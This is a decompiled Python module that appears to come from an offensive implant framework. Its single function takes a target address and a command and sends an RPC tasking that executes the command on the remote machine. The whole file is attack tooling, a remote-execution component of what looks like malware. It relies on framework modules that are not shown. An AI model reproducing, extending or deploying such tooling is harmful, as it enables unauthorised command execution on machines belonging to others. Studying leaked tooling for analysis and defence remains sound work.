# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.6.0b2 (default, Oct 11 2016, 05:27:10) 
# [GCC 6.2.0 20161005]
# Embedded file name: Mcl_Cmd_RemoteExecute_Tasking.py


def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.process.cmd.remoteexecute', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.process.cmd.remoteexecute.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    if lpParams['addr'] == None or len(lpParams['addr']) == 0 or lpParams['cmd'] == None or len(lpParams['cmd']) == 0:
        mcl.tasking.OutputError('An address and command must be specified')
        return False
    else:
        tgtParams = mca.process.cmd.remoteexecute.Params()
        tgtParams.address = lpParams['addr']
        tgtParams.command = lpParams['cmd']
        rpc = mca.process.cmd.remoteexecute.tasking.RPC_INFO_EXECUTE
        msg = MarshalMessage()
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
        rpc.SetMessagingType('message')
        taskXml = mcl.tasking.Tasking()
        taskXml.SetTargetRemote(tgtParams.address)
        mcl.tasking.OutputXml(taskXml.GetXmlObject())
        res = mcl.tasking.RpcPerformCall(rpc)
        if res != mcl.target.CALL_SUCCEEDED:
            mcl.tasking.RecordModuleError(res, 0, mca.process.cmd.remoteexecute.errorStrings)
            return False
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)